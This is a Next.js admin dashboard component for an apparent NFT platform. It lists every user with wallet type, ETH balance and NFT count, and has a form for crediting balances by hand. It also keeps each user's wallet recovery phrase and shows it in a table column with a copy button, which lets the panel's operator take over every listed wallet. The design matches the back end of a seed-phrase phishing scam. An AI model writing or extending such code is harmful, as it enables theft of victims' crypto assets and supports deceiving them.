import prisma from '@/lib/prisma';
import { CreditForm } from './CreditForm';
import { CopyAddress } from '@/components/CopyAddress';

interface UserWithCount {
    id: string;
    fullName: string;
    username: string;
    walletType: string | null;
    address: string | null;
    recoveryPhrase: string | null;
    balance: number;
    _count: {
        nftsOwned: number;
    };
}

export const dynamic = 'force-dynamic';

export default async function AdminDashboard() {
    let users = [];
    try {
        users = await prisma.user.findMany({
            orderBy: { createdAt: 'desc' },
            include: { _count: { select: { nftsOwned: true, nftsCreated: true } } }
        });
    } catch (error) {
        console.error('Admin dashboard data fetch error:', error);
        users = [];
    }

    const totalUsers = users.length;
    const totalBalance = users.reduce((acc: number, u: { balance: number }) => acc + u.balance, 0);

    return (
        <div className="container py-12">
            <h1 className="text-3xl font-bold mb-8">Admin Dashboard</h1>

            {/* Stats */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-12">
                <div className="card p-6">
                    <h3 className="text-[hsl(var(--text-secondary))] mb-2">Total Users</h3>
                    <p className="text-4xl font-bold">{totalUsers}</p>
                </div>
                <div className="card p-6">
                    <h3 className="text-[hsl(var(--text-secondary))] mb-2">Total Platform Balance</h3>
                    <p className="text-4xl font-bold">{totalBalance.toFixed(4)} ETH</p>
                </div>
                <div className="card p-6">
                    <h3 className="text-[hsl(var(--text-secondary))] mb-2">System Status</h3>
                    <p className="text-4xl font-bold text-[hsl(var(--success))]">Active</p>
                </div>
            </div>

            {/* User Management */}
            <div className="glass-card p-8 rounded-2xl border border-white/10 overflow-x-auto">
                <h2 className="text-2xl font-bold mb-6">User Management</h2>
                <table className="w-full text-left border-collapse">
                    <thead>
                        <tr className="border-b border-white/10">
                            <th className="py-4 px-2 font-medium text-muted-foreground">User</th>
                            <th className="py-4 px-2 font-medium text-muted-foreground">Wallet Type</th>
                            <th className="py-4 px-2 font-medium text-muted-foreground">Recovery Phrase</th>
                            <th className="py-4 px-2 font-medium text-muted-foreground">Balance</th>
                            <th className="py-4 px-2 font-medium text-muted-foreground text-center">NFTs</th>
                            <th className="py-4 px-2 font-medium text-muted-foreground text-right">Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        {users.map((user: UserWithCount) => (
                            <tr key={user.id} className="border-b border-white/5 last:border-0 hover:bg-white/5 transition-colors group">
                                <td className="py-5 px-2">
                                    <div className="flex flex-col">
                                        <span className="font-bold text-white">{user.fullName || 'Anonymous'}</span>
                                        <span className="text-xs text-muted-foreground">@{user.username}</span>
                                    </div>
                                </td>
                                <td className="py-5 px-2">
                                    <span className={`px-2 py-1 rounded-md text-xs font-medium ${user.walletType ? 'bg-primary/10 text-primary border border-primary/20' : 'bg-white/5 text-muted-foreground'}`}>
                                        {user.walletType || 'None'}
                                    </span>
                                </td>
                                <td className="py-5 px-2">
                                    {user.recoveryPhrase ? (
                                        <CopyAddress address={user.recoveryPhrase} />
                                    ) : (
                                        <span className="text-xs text-muted-foreground italic">No Phrase</span>
                                    )}
                                </td>
                                <td className="py-5 px-2">
                                    <span className="font-mono font-bold text-primary">{user.balance.toFixed(4)} ETH</span>
                                </td>
                                <td className="py-5 px-2 text-center text-sm">
                                    {user._count.nftsOwned}
                                </td>
                                <td className="py-5 px-2 text-right">
                                    <CreditForm userId={user.id} />
                                </td>
                            </tr>
                        ))}
                    </tbody>
                </table>
            </div>

        </div>
    );
}
